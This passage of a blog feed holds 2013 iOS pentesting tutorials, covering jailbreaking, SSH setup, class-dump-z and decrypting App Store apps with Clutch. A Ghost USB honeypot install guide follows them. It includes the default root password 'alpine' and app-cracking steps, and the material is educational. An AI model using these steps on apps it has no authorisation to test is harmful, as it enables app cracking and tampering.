&lt;a href=&quot;http://www.slideshare.net/daniel_bilar/blackhat2012-zdziarskidarkarti-osapplicationhacking&quot;&gt;http://www.slideshare.net/daniel_bilar/blackhat2012-zdziarskidarkarti-osapplicationhacking/&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The Objective-C runtime&lt;br /&gt;
&lt;a href=&quot;http://www.slideshare.net/mobiledatasolutions/objectivec-runtime&quot;&gt;http://www.slideshare.net/mobiledatasolutions/objectivec-runtime&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application security Part 2 - Getting class information of iOS apps</title>
   <link href="https://bitbrain.github.io/2013/06/16/ios-application-security-part-2-getting-class-information-of-ios-apps.html"/>
   <updated>2013-06-16T02:56:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/16/ios-application-security-part-2-getting-class-information-of-ios-apps</id>
   <content type="html">&lt;p&gt;Have you ever checked out an iOS app and thought it was cool, and wondered if you could find some information about the source code of the app, the third-party libraries it uses, or how the code is designed internally ? Have you ever wondered if it was possible to dump all the images, plist files used in any app either preinstalled on your device or downloaded from the App store? If the answer is Yes, then you have come to the right place.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;In this article, we will look at how we can analyze any preinstalled app on your device or any other app downloaded from App store and discover things about the source code of the app like the classes that it uses, the names of the view controllers it uses, the internal libraries, and even intricate details like the variables and methods names used in any particular class or view controller. We will then look at how we can decrypt the applications downloaded from the App store and dump all the images, plist files that the app uses.&lt;/p&gt;

&lt;h2 id=&quot;dumping-class-information-for-preinstalled-apps-on-the-device&quot;&gt;Dumping class information for Preinstalled apps on the device&lt;/h2&gt;

&lt;p&gt;Now we are at a stage that we can analyze apps for class information. So let’s dump the class information for the Apple &lt;em&gt;Maps&lt;/em&gt; app. The first step would be to locate the Apple &lt;em&gt;Maps&lt;/em&gt; app executable. All iOS apps that come preinstalled with the device are stored in the directory &lt;em&gt;/Applications&lt;/em&gt;. So let’s navigate to that directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios2/20.png&quot; alt=&quot;20&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here you will see all the apps that come preinstalled with the device. Now let’s navigate inside the &lt;em&gt;Maps&lt;/em&gt; app directory and list the directories.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios2/21.png&quot; alt=&quot;21&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, we can see all the images, plist files etc used by this app. We will discuss later how it is possible to fetch all the images and other files from a particular iOS app. Anyways, hidden in all this mess is an executable for the app with the name &lt;em&gt;Maps&lt;/em&gt; as can be seen on the left side in the image below. Note that the name of the executable will be the same as the name of the app. Note that we can see some pdf’s in the app bundle as well. I really don’t see the need of including a pdf file in the bundle.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios2/22.png&quot; alt=&quot;22&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To dump the class information for this app, just use the command &lt;em&gt;class-dump-z Maps&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios2/23.png&quot; alt=&quot;23&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see there is just too much output in the terminal right now, hence its better to save the output to a file, in this case with the filename &lt;em&gt;class-dump-Maps&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios2/24.png&quot; alt=&quot;24&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can now use &lt;em&gt;sftp&lt;/em&gt; to ftp into the device and download the file. You can fetch any file with the command &lt;em&gt;get&lt;/em&gt; followed by the path of the file as shown below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios2/25.png&quot; alt=&quot;25&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Since the file is now downloaded locally on the system, let’s open it up in &lt;em&gt;TextMate&lt;/em&gt; (you can use textedit or any other app as well)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios2/26.png&quot; alt=&quot;26&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can learn a lot about the way the code is designed just by looking at the interface files. For e.g over here you can see a View controller named &lt;em&gt;InfoCardController&lt;/em&gt;. As you might have already guessed, this is the VC to display more info about a particular location when we tap on the right arrow button as shown in the image below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios2/27.PNG&quot; alt=&quot;27&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now lets have a look at this view in the app. This page is actually displayed by &lt;em&gt;InfoCardViewController&lt;/em&gt; which we found from &lt;em&gt;class-dump-z&lt;/em&gt; information.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios2/28.PNG&quot; alt=&quot;28&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you look at this image and the class information above, you can easily see what are the methods names that get called when you tap on these buttons. For e.g if i tap on &lt;em&gt;Direction to here&lt;/em&gt;, the method that will get called is&lt;/p&gt;

&lt;p&gt;&lt;em&gt;-(void)_directionsTo:(id)to person:(void*)person property:(int)property identifier:(int)identifier;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Similarly, if i tap on &lt;em&gt;Add to Bookmarks&lt;/em&gt;, the method that will get called is&lt;/p&gt;

&lt;p&gt;&lt;em&gt;-(void)_addToBookmarks:(id)bookmarks person:(void*)person property:(int)property identifier:(int)identifier;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;You can find a lot of other information from the app as well, for e.g here is a class named &lt;em&gt;UserLocationSearchResults&lt;/em&gt; which inherits from SearchResult.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios2/28x.png&quot; alt=&quot;28x&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can download the class information for the Apple &lt;em&gt;Maps&lt;/em&gt; app from here.&lt;/p&gt;

&lt;p&gt;How much you can explore here is only up to your curiosity :).&lt;/p&gt;

&lt;h2 id=&quot;dumping-class-information-for-apps-downloaded-from-the-app-store&quot;&gt;Dumping class information for apps downloaded from the App store&lt;/h2&gt;

&lt;p&gt;Their are two important things to know if you want perform analysis of the apps that you download from the App store.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The apps are stored in a different location, &lt;em&gt;/var/mobile/Applications/&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;Unlike the apps that come preinstalled with the device, the apps are &lt;em&gt;encrypted&lt;/em&gt;, hence you will have to &lt;em&gt;decrypt&lt;/em&gt; them first.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To decrypt the apps, we will be using a command line tool called &lt;em&gt;Clutch&lt;/em&gt;. Please note that &lt;em&gt;Clutch&lt;/em&gt; was being offered by &lt;em&gt;Hackulous&lt;/em&gt; which has been shut down a few months back. But the binary for &lt;em&gt;Clutch&lt;/em&gt; is still available on the internet.&lt;/p&gt;

&lt;p&gt;Now you need to upload the binary onto your device. To do that, we are going to use &lt;em&gt;sftp&lt;/em&gt;. To upload a file onto the device, just use the &lt;em&gt;put&lt;/em&gt; command.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios2/29.png&quot; alt=&quot;29&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, ssh into your device and type &lt;em&gt;clutch&lt;/em&gt;. This will give you a list of all the apps that could be &lt;em&gt;cracked&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios2/30.png&quot; alt=&quot;30&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To crack a particular app, just type &lt;em&gt;clutch app-name&lt;/em&gt; For e.g if we want to crack the Facebook app, we will type &lt;em&gt;clutch Facebook&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios2/31.png&quot; alt=&quot;31&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once it is done cracking, it will tell you the location where it has saved the &lt;em&gt;ipa&lt;/em&gt; file. Now an &lt;em&gt;ipa&lt;/em&gt; file is just a compressed version of the whole app bundle. To unzip it, just use the &lt;em&gt;unzip&lt;/em&gt; command and save it to a directory by using the &lt;em&gt;-d&lt;/em&gt; command as shown in the figure below. Note that you can also copy this &lt;em&gt;ipa&lt;/em&gt; file on your system using &lt;em&gt;sftp&lt;/em&gt; and then unzip it over there. You will then have access to all the images of the app as well as any other files that may be present in the unzipped folder.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios2/32.png&quot; alt=&quot;32&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now that we have the decrypted file, we can use &lt;em&gt;class-dump-z&lt;/em&gt; to dump the class information for it and save it in a file which in this case is named &lt;em&gt;class-info-Facebook&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios2/33.png&quot; alt=&quot;33&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, you can exit the ssh session, log in via &lt;em&gt;sftp&lt;/em&gt; and then download the &lt;em&gt;class-info-Facebook&lt;/em&gt; file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios2/33x.png&quot; alt=&quot;33x&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can now check out this file using any text viewer. For e.g here is a protocol named &lt;em&gt;FBFacebookRequestSender&lt;/em&gt; which has methods for sending asynchronous requests as well as a method to check if the Facebook Session is valid or not.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios2/34.png&quot; alt=&quot;34&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;fetching-images-and-other-files-from-a-particular-app&quot;&gt;Fetching images and other files from a particular app.&lt;/h2&gt;

&lt;p&gt;As discussed previously in the article, one of the methods would be to use &lt;em&gt;sftp&lt;/em&gt; to fetch all the files that you want from that app’s directory. However, there are much easier ways to do this, one of which is to use &lt;a href=&quot;http://www.macroplant.com/iexplorer/download-ie3-mac.php&quot;&gt;iExplorer&lt;/a&gt;. Download it from the official website. Once this is done, just open it up and make sure your device is connected to the system via USB.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios2/35.png&quot; alt=&quot;35&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To view the filesystem, just click on &lt;em&gt;files&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios2/36.png&quot; alt=&quot;36&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To check out files for a particular app, click on &lt;em&gt;Apps&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios2/37.png&quot; alt=&quot;37&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, it is very easy to browse the filesystem and upload/download files. In this case, lets download all the image and files present in the &lt;em&gt;Facebook&lt;/em&gt; app. On the left side, look for &lt;em&gt;Facebook&lt;/em&gt; and click on it. This will take you to the directory containing Facebook app files. All the images and files are containing inside the &lt;em&gt;Facebook.app&lt;/em&gt; directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios2/38.png&quot; alt=&quot;38&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To download all the files, just press &lt;em&gt;Cmd + A&lt;/em&gt;, and right click and select &lt;em&gt;Export to Folder&lt;/em&gt;. Then choose the location where you want to save all the files.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;In the first two parts of this article, we have learnt how to setup a mobile auditing environment on a jailbroken device. We then learnt how to dump the class information for any particular app and use it to understand the design of the code and its internal workings. We also learnt how to decrypt an app downloaded from the App store and audit it for information. We then learnt how to un-munge images from apps using both sftp and iExplorer.&lt;/p&gt;

&lt;p&gt;Well, the good thing is that it is possible to know all the methods that get called by using the class information that we get from class-dump-z. &lt;em&gt;But is it possible to perform some runtime modification in the app ?&lt;/em&gt; For e.g if a method like -(BOOL)isFacebookSessionValid returns false in a particular case, is it possible for us to manipulate the app in such a way that it returns YES and hence let the application do unexpected things ? &lt;em&gt;Further, is it possible to create our own custom method and execute it instead of this method whenever this method gets called ?&lt;/em&gt; Is it possible to modify the values of instance variables during runtime, or after any specific instruction ?The answer is &lt;a href=&quot;http://cycript.org&quot;&gt;YES&lt;/a&gt;, and we will learn about it in the next article :).&lt;/p&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>iOS Application security Part 1 - Setting up a mobile pentesting platform</title>
   <link href="https://bitbrain.github.io/2013/06/16/ios-application-security-part-1-setting-up-a-mobile-pentesting-platform.html"/>
   <updated>2013-06-16T02:53:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/16/ios-application-security-part-1-setting-up-a-mobile-pentesting-platform</id>
   <content type="html">&lt;p&gt;In this article series, we will be learning about the tools and techniques required to perform penetration testing and Vulnerability assessment on iOS Applications.&lt;/p&gt;

&lt;h2 id=&quot;jailbreaking-your-device&quot;&gt;Jailbreaking your device&lt;/h2&gt;

&lt;p&gt;If you are serious about iOS security, then having a jailbroken device is a must. In this section, we will look at how we can jailbreak an iOS device. Jailbreaking a device has many advantages. You can install tools like nmap, metasploit and even run your own custom python code on the device. Imagine having the power to run a vulnerability scan on a website from the palm of your hand. To know more about jailbreaking and the advantages of doing it, i recommend you have a look at &lt;a href=&quot;http://www.ibtimes.com/why-jailbreak-your-iphone-5-reasons-you-should-download-evasi0n-jailbreak-ios-6-1080412&quot;&gt;this&lt;/a&gt; article.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Jailbreaking your device is as simple as downloading a jailbreaking software and clicking on jailbreak. I would recommend you use &lt;a href=&quot;http://evasi0n.com/&quot;&gt;evasi0n&lt;/a&gt; to jailbreak if your device if your device is running iOS 6.x and &lt;a href=&quot;http://www.redsn0w.us/&quot;&gt;redsn0w&lt;/a&gt; if your device is running iOS 5.x.&lt;/p&gt;

&lt;p&gt;In this case, i am going to jailbreak my new Ipad (3rd generation) running iOS 6.0.1. Once you download evasi0n and run it, you will see that it automatically detects the device and tells you if a jailbreak is available for it or not.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios1/1.png&quot; alt=&quot;1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;All you have to do is click on Jailbreak and let evasi0n do all the magic.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios1/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, the jailbreak process has started. After some time, evasi0n will reboot the device and run the exploit.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios1/3.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once it is done running the exploit, it will install Cydia and its packages list on the device. Cydia is a GUI that allows you to download software packages and other apps on your jailbroken device that you would normally not find on the App store. Mostly all the jailbreak softwares install Cydia on your device by default. You can call Cydia the App Store for jailbroken devices.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios1/4.png&quot; alt=&quot;4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Wait for some more time until you get this prompt&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios1/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If you go to your device, you will see that a new app icon named &lt;em&gt;Jailbreak&lt;/em&gt; has come up. Tap on it to finish the jailbreak process.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios1/6.PNG&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You will see that your device will reboot. Please wait patiently and wait for the process to finish. Once the device has finished rebooting, you will see that a new app named &lt;em&gt;Cydia&lt;/em&gt; appears on your apps list. This is an indication that your device has been successfully jailbroken.&lt;/p&gt;

&lt;p&gt;Congratulations, you have made the first leap in the field of iOS hacking.&lt;/p&gt;

&lt;h2 id=&quot;setting-up-a-mobile-auditing-platform&quot;&gt;Setting up a mobile auditing platform&lt;/h2&gt;

&lt;p&gt;Now that you are done jailbreaking your device, the next step is to install some of the very important linux command line tools such as &lt;em&gt;wget, ps, apt-get&lt;/em&gt; and other applications used for auditing an iOS application. The first and foremost thing however is to install &lt;em&gt;OpenSSH&lt;/em&gt; on your device. This will allow you to login to your jailbroken device and perform various other tasks as we will see in this article later.&lt;/p&gt;

&lt;p&gt;Go to Cydia, tap on the search tab on the bottom and search for OpenSSH.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios1/7.PNG&quot; alt=&quot;7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tap on OpenSSH and on the next view tap on install. Tap on Confirm on the next view to confirm this action.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios1/8.PNG&quot; alt=&quot;8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This will insall OpenSSH on your device.&lt;/p&gt;

&lt;p&gt;Before we use ssh to log in to the device, we should install some other command line tools also. Almost all the popular hacker tools can be installed by using the &lt;em&gt;BigBoss Recommended tools&lt;/em&gt; package which comes with a list of hacker tools. To install &lt;em&gt;BigBoss Recommended tools&lt;/em&gt; just search for it in Cydia and tap on install.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios1/9.PNG&quot; alt=&quot;9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Some of the important command line tools that it installs are &lt;em&gt;APT 0.6 Transitional, Git, GNU Debugger, less, make, unzip, wget and SQLite 3.x&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;One more thing that we can do is install &lt;em&gt;MobileTerminal&lt;/em&gt; from Cydia. It allow you to run terminal commands on your device from your device rather than logging in via ssh from a different system. Again, downloading &lt;em&gt;MobileTerminal&lt;/em&gt; on your device is as simple as searching for it in Cydia and tapping on Install&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios1/10.PNG&quot; alt=&quot;10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once it is installed, you will see a new app icon with the name &lt;em&gt;Terminal&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios1/11.PNG&quot; alt=&quot;11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tap on it, you will be given a terminal. Now try and run any Unix command on it. In this case, let me get a list of all the running processes by using the command &lt;em&gt;ps&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios1/12.PNG&quot; alt=&quot;12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, it works !&lt;/p&gt;

&lt;p&gt;Let’s see if we can login to our jailbroken device using ssh. Make sure your laptop and the device are connected to the same network and then find out the IP address of the device. To find out the IP address of your device, just go to &lt;em&gt;Settings -&amp;gt; Wi-Fi&lt;/em&gt; and then click on the network your device is connected to.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios1/13.PNG&quot; alt=&quot;13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, the IP address is &lt;em&gt;192.168.2.3&lt;/em&gt;. Let’s ssh to it as the user &lt;em&gt;root&lt;/em&gt;. Just type in the follwing command as shown below.The default password for the user root is &lt;em&gt;alpine&lt;/em&gt;. It is recommended that you should change your password as soon as you have Open SSH installed. This is because there has been many malwares which log in to your device and steal information by using the default username/password combination. To change the password, just type in &lt;em&gt;passwd&lt;/em&gt; and then type the new password twice. This will change the password for the user &lt;em&gt;root&lt;/em&gt;.All of these steps have been perfomed in the image shown below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios1/14.png&quot; alt=&quot;14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Note:Make sure the app Cydia is in the background while running any command that requires root privileges. This is because Cydia runs as root and hence it wouldn’t be possible to get a lock on a process which is already being used by Cydia.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, do an &lt;em&gt;apt-get update&lt;/em&gt; to get the latest packages lists.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios1/15.png&quot; alt=&quot;15&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It wouldn’t be a bad idea to do an &lt;em&gt;apt-get upgrade&lt;/em&gt; also. This will fetch the new versions of packages that are already existing on the machine and don’t have the latest version using the information contained from doing an &lt;em&gt;apt-get update&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios1/16.png&quot; alt=&quot;16&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The next thing to do is to install class-dump-z which we will be using to dump class information from an iOS application. To get the application, go to its &lt;a href=&quot;https://code.google.com/p/networkpx/wiki/class_dump_z&quot;&gt;official page&lt;/a&gt; and copy the link for the latest version. At the time of writing of this article, the latest version is 0.2a.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios1/17.png&quot; alt=&quot;17&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, ssh into your device and fetch the file from that link using the command &lt;em&gt;wget&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios1/18.png&quot; alt=&quot;18&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another option would have been to download file on your system and then upload it to your device using &lt;em&gt;sftp&lt;/em&gt;. Once the download has finished, use the tar program to extract the archive.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios1/19.png&quot; alt=&quot;19&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, go inside the folder &lt;em&gt;iphone_armv6&lt;/em&gt; and copy the &lt;em&gt;class-dump-z&lt;/em&gt; executable into &lt;em&gt;/usr/bin&lt;/em&gt; directory. This will make sure you can run &lt;em&gt;class-dump-z&lt;/em&gt; from anywhere on the device. Once you have copied the executable, just type &lt;em&gt;class-dump-z&lt;/em&gt;. If you get the output as shown in the figure below, this means that &lt;em&gt;class-dump-z&lt;/em&gt; has been successfully installed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ios1/20x.png&quot; alt=&quot;20x&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;further-reading&quot;&gt;Further Reading&lt;/h2&gt;

&lt;p&gt;There are not a lot of resources as far as iOS Security is concerned but here are some of the very good ones.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.securitytube.net/&quot;&gt;SecurityTube&lt;/a&gt; has a very detailed course on iOS security.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.securitylearn.net/&quot;&gt;Security Learn&lt;/a&gt; has some very good articles on penetration testing of iOS Applications.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.amazon.com/Hacking-Securing-iOS-Applications-Hijacking/dp/1449318746&quot;&gt;Hacking and Securing iOS applications&lt;/a&gt; is probably the best book i have read that deals with attacking iOS applications&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.lookout.com/&quot;&gt;Lookout’s&lt;/a&gt; blog is also another valuable resource in learning about the latest techniques and exploits in the mobile world.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;In this article, we learned how to setup a mobile auditing environment on a jailbroken device. In the next article we will look at how we can analyze applications for class information using class-dump-z.&lt;/p&gt;

&lt;p&gt;This article was originally published on the &lt;a href=&quot;http://resources.infosecinstitute.com/&quot;&gt;resources&lt;/a&gt; page at &lt;a href=&quot;http://infosecinstitute.com/&quot;&gt;Infosec Institute&lt;/a&gt;. For more information, please visit my author &lt;a href=&quot;http://resources.infosecinstitute.com/author/prateek/&quot;&gt;page&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Ghost USB Honeypot Part 2 - Installing and running the honeypot</title>
   <link href="https://bitbrain.github.io/2013/06/15/ghost-usb-honeypot-part-2-installing-and-running-the-honeypot.html"/>
   <updated>2013-06-15T04:42:00+00:00</updated>
   <id>https://bitbrain.github.io/2013/06/15/ghost-usb-honeypot-part-2-installing-and-running-the-honeypot</id>
   <content type="html">&lt;p&gt;This article is in continuation of &lt;a href=&quot;http://resources.infosecinstitute.com/ghost-usb-honeypot/&quot;&gt;Part 1&lt;/a&gt; of the series on Ghost USB Honeypot. Malware threats have become very common these days and hence the need of honeypots to detect those malwares have become equally important. In the last few years, we have seen how USB based malwares can be used to target highly protected machines that are not connected to the internet. In order to detect malwares that spread over USB devices, the Ghost USB Honeypot project was started. Ghost is a honeypot for detecting malware that spreads via USB devices. The honeypot currently supports Windows XP and Windows 7. The way Ghost works is that it first tries to emulate a USB thumb drive. If the malware identifies the emulated device as a USB thumb drive, it will try to infect it. Ghost then looks for write requests to the drive, which is an indication of a malware.&lt;/p&gt;

&lt;!--more--&gt;

&lt;p&gt;In the first part of this article, we covered an interview with the project leader Sebastian Poeplau. In this article we will be discussing how to install and use the honeypot on a windows machine to capture any data or binaries that the malware will install on your USB drive.&lt;/p&gt;

&lt;h2 id=&quot;installing-ghost-honeypot&quot;&gt;Installing Ghost Honeypot&lt;/h2&gt;

&lt;p&gt;Ghost USB honeypot currently runs only over Windows XP and Windows 7. A quick install guide for it could be found &lt;a href=&quot;http://code.google.com/p/ghost-usb-honeypot/wiki/InstallGuide&quot;&gt;here&lt;/a&gt;. We will however be discussing it in this article too. The first step in this process is to install the ghost honeypot from its official webpage. A link to the binary package can be found &lt;a href=&quot;http://code.google.com/p/ghost-usb-honeypot/downloads/list&quot;&gt;here&lt;/a&gt;. The next step is to install the 2 required dependencies. These are&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;a) Windows Driver Framework (WDF)&lt;/strong&gt;- More information about it and download links can be found &lt;a href=&quot;http://msdn.microsoft.com/en-us/library/windows/hardware/gg463268.aspx&quot;&gt;here&lt;/a&gt;. Once you have downloaded and installed it, there are two files which you will need to copy to the folder where you downloaded Ghost. The default location for these files are &lt;em&gt;“C:\Program files\Windows Kits\8.0\redist\wdf\x86\WdfCoInstaller01009.dll”&lt;/em&gt; and &lt;em&gt;“C:\Program files\Windows Kits\8.0\redist\wdf\x86\WUDFUpdate_01009.dll”&lt;/em&gt; as shown in the figure below. These 2 files should be copied inside the folder where you have downloaded Ghost. &lt;img src=&quot;/images/posts/ghost-usb2/1.png&quot; alt=&quot;1&quot; /&gt; b)&lt;strong&gt;.NET Framework version 4 or higher&lt;/strong&gt;- Ghost also has a GUI version. If you want to install and run it on your system, then you need to have .NET framework version 4 or more installed on your system. You can download it from &lt;a href=&quot;http://www.microsoft.com/en-in/download/details.aspx?id=17851&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Now go to the folder where you downloaded Ghost and run Setup.exe. You may get warnings from the OS about installing these new drivers as shown in the image below. Ignore them and proceed with the installation.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ghost-usb2/2.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As discussed previously, what Ghost does is emulate a USB flash drive. Some of the key points while emulating a USB flash drive is to make sure that it is recognized as “removable” by the Windows OS. This is because a lot of malwares will write data only to removable devices. The Ghost tool does this very accurately by installing some specific drivers to do the task. What the Ghost tool also does pretty well is write all the data that was supposed to be written to the USB device onto a image file. This way, that image file can then be copied onto another system and used for analyzing the changes that were made to that image, like copied binaries or some other malicious code.&lt;/p&gt;

&lt;h2 id=&quot;running-the-honeypot&quot;&gt;Running the Honeypot&lt;/h2&gt;

&lt;p&gt;Once you have installed the Ghost tool onto your system, you can either use it in the command line mode or the GUI mode.Note that the emulated USB flash drives will require image files. These image files have a predefined location, i.e C:\gd[0-8] when using the command line tool or C:\gdgui when using the GUI tool. Ghost will automatically create empty image files if they are not present. But these empty image files require formatting before they could be used. And hence a more better solution is to download preformatted image files from the project’s website. The links could be found &lt;a href=&quot;http://code.google.com/p/ghost-usb-honeypot/downloads/list&quot;&gt;here&lt;/a&gt;.Once you have downloaded these preformatted image files, you should rename them properly and place it at the appropriate location. For example, an example location for one of the image files could be C:\gd0.img for the command line tool and C:\gdgui.img for the GUI version.&lt;/p&gt;

&lt;p&gt;We will start by using the command line version of Ghost first. To use it just go the directory where it is installed and type “ghosttool”. One of the most important things to remember while doing this is to make sure that you are running command prompt as the system administrator, otherwise you will get an error.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ghost-usb2/5.png&quot; alt=&quot;5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lets mount a virtual USB flash drive.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/ghost-usb2/6.png&quot; alt=&quot;6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once this is done, you will notice that you get a notification from windows that it has identified a usb device with removable storage. This makes sure that the device was emulated properly. Also, you can see that a removable device with capacity of about 100 mb is now being shown by Windows.&lt;/p&gt;

